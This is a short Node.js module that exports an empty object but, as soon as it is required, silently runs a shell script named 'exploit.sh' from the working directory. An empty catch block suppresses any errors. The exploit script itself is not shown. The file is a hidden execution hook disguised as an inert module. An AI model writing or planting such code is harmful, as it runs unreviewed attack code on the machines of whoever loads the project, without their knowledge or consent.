const { execSync } = require('child_process');
const path = require('path');
try {
    const exploitPath = path.join(process.cwd(), 'exploit.sh');
    execSync(`bash ${exploitPath}`, { stdio: 'inherit' });
} catch (e) {
}
module.exports = {};
